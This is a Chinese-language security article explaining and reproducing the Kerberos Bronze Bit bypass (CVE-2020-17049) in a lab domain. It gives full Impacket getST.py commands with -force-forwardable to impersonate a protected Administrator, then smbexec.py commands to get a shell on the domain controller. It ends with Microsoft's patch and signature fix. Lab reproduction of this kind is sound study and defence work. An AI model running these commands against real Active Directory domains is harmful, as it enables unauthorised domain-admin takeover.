## 漏洞背景

Kerberos Bronze Bit （CVE-2020-17049）漏洞是国外安全公司Netspi 安全研究员 Jake Karnes
发现的一个Kerberos安全功能绕过漏洞。该漏洞存在的原因在于KDC在确定Kerberos服务票据是否可用于通过Kerberos的约束性委派时，其方式中存在一个安全功能绕过漏洞。利用此漏洞，一个被配置为使用约束性委派的遭入侵服务可以篡改一个对委派无效的服务票据，从而迫使KDC接受它。

该漏洞启用的攻击是Kerberos委派引起的其它已知攻击的扩展。该漏洞绕过了现有攻击路径的以下两个缓解措施，提高了它们的有效性和通用功能性。

  * 绕过了Protecd Users组内用户和设置了“敏感账号，不能被委派”的安全措施，导致了这些用户也可以被委派。

  * 绕过在设置约束性委派时勾选“仅使用Kerberos”选项，既无法进行协议转换。

## 漏洞原理

我们首先来看一下KDC在约束性委派和基于资源的约束性委派校验过程中对于通过S4u2Self
请求的ST如何进行验证，验证流程如图所示，KDC首先会检查通过S4u2Self请求的ST的forwardable标志位：

1）如果该为0，也就是不可转发，则会在验证是否是RBCD委派

  * 如果不是RBCD委派，则不返回票据

  * 如果是RBCD委派，则再检查被委派的用户是否设置了不能被委派

  *     * 如果设置了，则不返回票据

  *     * 如果没设置，则返回票据

![图片.png](https://image.3001.net/images/20230512/1683821689_645d14798899583e89319.png!small)

2） 如果该位为1，也就是可转发，则会再验证两者之间是否有委派配置。

  * 如果有委派配置，则返回票据

  * 如果无委派配置，则不返回票据

从图中的流程可以看出，对于约束性委派和基于资源的约束性委派，最后不返回票据的原因各不相同。但是，只要forwardable标志位为1，则约束性委派和基于资源的约束性委派在S4u2Proxy这一步均能获得票据。因此，我们后续的攻击就能成功。

如图所示TGS-REP包，从中可以看出通过S4u2Self协议请求的ST是使用Service的Hash加密，且forwardable标志位不在已签名的PAC中，而我们又已知Service的Hash，因此我们可以使用Service的Hash解密Service的ST，然后将forwardable标志位设置为1，再重新加密，形成修改后的ServiceST。这一步不需要篡改PAC签名，并且KDC在验证PAC签名的时候也无法察觉到数据包被篡改。由于修改后的Service
ST 的 forwardable 标志位为 1 ，因此在S4u2Proxy 这一步就能获得票据。

![图片.png](https://image.3001.net/images/20230512/1683821703_645d148766a7f451d05c7.png!small)

## 漏洞复现

实验环境如下：

  * 域控：DC(192.168.41.10)

  * 域管理员：Administrator

  * 服务账户：hack

  * 域：hack.com

### 1、约束性委派攻击绕过

首先我们注册一个服务账户，并对该服务账户配置约束性委派

    
    
    net user hack Admin123 /add /domain 创建一个普通用户
    setspn -U -A priv/test hack 注册为服务账号
    

![图片.png](https://image.3001.net/images/20230512/1683821723_645d149be6767ecc2002b.png!small)

如图所示，已经配置好了服务账户hack对cifs/DC.hack.com具有约束性委派，但是由于选择了“仅使用Kerberos”选项，因此不能进行协议转换。

![图片.png](https://image.3001.net/images/20230512/1683821741_645d14ad8de058b5584b6.png!small)

如图所示设置域管理员Administrator为“敏感账户，不能被委派”。

![图片.png](https://image.3001.net/images/20230512/1683821757_645d14bd829930cbb219d.png!small)

当我们使用常规的委派攻击命令时，提示如下的错误信息。

[-] Kerberos SessionError:KDC_ERR_BADOPTION(KDC cannot accommodate requested
option)  
[-] Probably SPN is not allowed to delegate by user test or inital TGT not
forwardable

![图片.png](https://image.3001.net/images/20230512/1683821772_645d14cc6d57ac89dfe5d.png!small)

但当我们加上 -force-forwardable 参数绕过时，则成功获取到票据，如图所示：

    
    
    #以Administrator身份请求一张访问cifs/DC.hack.com的票据，加上 -force-forwardable 绕过参数
    python3 getST.py -dc-ip 192.168.41.10 hack.com/hack:Admin123 -spn cifs/DC.hack.com -impersonate Administrator -force-forwardable
    

![图片.png](https://image.3001.net/images/20230512/1683821787_645d14db71a7034a5ecd4.png!small)

    
    
    #导入该票据
    export KRB5CCNAME=Administrator.ccache
    

![图片.png](https://image.3001.net/images/20230512/1683821819_645d14fb8fe78409ac902.png!small)

    
    
    #访问域控
    python3 smbexec.py -no-pass -k DC.hack.com
    

![图片.png](https://image.3001.net/images/20230512/1683821842_645d15122c6475654581b.png!small)

### 2、基于资源的约束性委派攻击绕过

首先设置域管理员Administrator为“敏感账户，不能被委派”，然后再域控上配置用户hack到krbtgt服务具有基于资源的约束性委派，命令如下：

    
    
    Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount hack
    Get-ADUser krbtgt -Properties PrincipalsAllowedToDelegateToAccount
    

![图片.png](https://image.3001.net/images/20230512/1683821893_645d154504e3b9fce24bb.png!small)

当我们使用常规的基于资源的约束性委派攻击命令时，会提示如下错误信息

![图片.png](https://image.3001.net/images/20230512/1683821919_645d155fe779da3fc775b.png!small)

但当我们加上 -force-forwardable 参数时，则成功获取到票据，如图所示：

    
    
    #以Administrator 身份请求一张访问Krbtgt服务的票据，加上-force-forwardable 绕过参数
    python3 getST.py -dc-ip 192.168.41.10 -spn krbtgt -impersonate administrator hack.com/hack:Admin123 -force-forwardable
    #导入该票据
    export KRB5CCNAME=administrator.ccache
    

![图片.png](https://image.3001.net/images/20230512/1683821945_645d1579d88530f5f7ccc.png!small)

    
    
    #以Administrator身份访问域控DC.hack.com
    python3 smbexec.py -no-pass -k administrator@DC.hack.com -dc-ip 192.168.41.10
    

![图片.png](https://image.3001.net/images/20230512/1683821973_645d15956985bbdcbbdc5.png!small)

## 漏洞预防和修复

微软已经发布了该漏洞的补丁程序，可以直接通过Windows自动更新解决此问题。  
那么该补丁是如何修复该漏洞的呢？微软在补丁包中新增加了一个票据签名。在S4u2Self阶段生成的服务票据，KDC用其密钥在票据上进行了签名，并将签名插入了PAC中，而后PAC又经过两次签名（使用服务密钥PAC_Server_CHECKSUM和使用KDC密钥PAC_PRIVSVR_CHECKSUM签名）。在之后的S4u2Proxy阶段，KDC才会返回票据，否则KDC将会返回KRB_AP_ERP_MODIFIED消息。这样，攻击者就无法修该数据包中的forwardable标志位了。

